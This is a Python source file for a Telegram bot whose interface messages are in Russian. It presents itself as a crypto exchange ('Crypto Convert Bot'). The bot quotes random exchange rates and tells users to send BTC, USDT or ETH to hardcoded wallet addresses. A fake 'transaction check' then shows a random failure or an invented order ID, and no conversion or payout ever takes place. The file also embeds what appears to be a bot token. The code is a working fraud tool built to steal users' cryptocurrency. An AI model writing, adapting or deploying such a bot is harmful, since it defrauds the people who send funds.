import asyncio
import random
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F

TOKEN = "8948005450:AAEk7z0dB6T77ul7OWKxTzc1n05DmHFG_Ss"
BTC_WALLET = "bc1qesglaagaren95r77058jkqkf30tc67secguqg9"
USDT_TRC20 = "TAe3mLs47nbmjUnfRBp7SMVruoebwebJA1"
USDT_ERC20 = "0xb763649adF90aa5E30C5303e02412392f87F9420"
ETH_WALLET = "0xb763649adF90aa5E30C5303e02412392f87F9420"

bot = Bot(token=TOKEN)
dp = Dispatcher()
orders = {}

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "💱 *Добро пожаловать в Crypto Convert Bot!*\n\n"
        "Выберите пару для обмена:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="BTC → USDT", callback_data="BTC_USDT")],
                [InlineKeyboardButton(text="USDT → BTC", callback_data="USDT_BTC")],
                [InlineKeyboardButton(text="BTC → ETH", callback_data="BTC_ETH")]
            ]
        )
    )

@dp.callback_query()
async def process_pair(callback: types.CallbackQuery):
    from_cur, to_cur = callback.data.split("_")
    orders[callback.from_user.id] = {"from": from_cur, "to": to_cur}
    
    if from_cur == "USDT":
        await callback.message.edit_text(
            "💵 Вы выбрали *USDT*\n\n"
            "Выберите сеть для отправки:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="TRC20", callback_data="net_USDT_TRC20")],
                    [InlineKeyboardButton(text="ERC20", callback_data="net_USDT_ERC20")]
                ]
            )
        )
    else:
        network = "BTC" if from_cur == "BTC" else "ERC20"
        wallet = BTC_WALLET if from_cur == "BTC" else ETH_WALLET
        await ask_amount(callback.message, from_cur, to_cur, wallet, network)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("net_"))
async def process_network(callback: types.CallbackQuery):
    _, from_cur, network = callback.data.split("_")
    wallet = USDT_TRC20 if network == "TRC20" else USDT_ERC20
    to_cur = orders[callback.from_user.id]["to"]
    await ask_amount(callback.message, from_cur, to_cur, wallet, network)
    await callback.answer()

async def ask_amount(message: types.Message, from_cur: str, to_cur: str, wallet: str, network: str):
    await message.edit_text(
        f"💵 *{from_cur} → {to_cur}*\n"
        f"🌐 Сеть: *{network}*\n\n"
        f"Введите сумму *{from_cur}*:",
        parse_mode="Markdown"
    )
    orders[message.chat.id]["wallet"] = wallet
    orders[message.chat.id]["network"] = network

@dp.message(F.text)
async def process_amount(message: types.Message):
    user_id = message.from_user.id
    if user_id not in orders or "wallet" not in orders[user_id]:
        await message.answer("Сначала выберите пару через /start")
        return
    try:
        amount = float(message.text.replace(",", "."))
    except ValueError:
        await message.answer("❌ Введите число")
        return
    from_cur = orders[user_id]["from"]
    to_cur = orders[user_id]["to"]
    wallet = orders[user_id]["wallet"]
    network = orders[user_id]["network"]
    rate = random.uniform(1.0, 1.5) if from_cur == "BTC" else random.uniform(0.8, 1.2)
    result = round(amount * rate, 2)
    await message.answer(
        f"📊 *Детали обмена:*\n\n"
        f"Сумма: {amount} {from_cur}\n"
        f"Вы получите: ~{result} {to_cur}\n"
        f"🌐 Сеть: {network}\n\n"
        f"💳 *Отправьте {amount} {from_cur} на кошелёк:*\n"
        f"`{wallet}`\n\n"
        f"_После отправки нажмите «Я оплатил»_",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid")]
            ]
        )
    )

@dp.callback_query(lambda c: c.data == "paid")
async def process_paid(callback: types.CallbackQuery):
    await callback.message.edit_text("⏳ *Проверка транзакции...*", parse_mode="Markdown")
    await asyncio.sleep(3)
    if random.random() < 0.5:
        await callback.message.edit_text(
            "❌ *Ошибка:* Транзакция не найдена. Проверьте кошелёк и сумму.",
            parse_mode="Markdown"
        )
    else:
        await callback.message.edit_text(
            "✅ *Заявка принята!*\n\n"
            f"ID: `{random.randint(10000, 99999)}`\n"
            "Ожидайте от 10 минут до 2 часов.",
            parse_mode="Markdown"
        )
    await callback.answer()

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
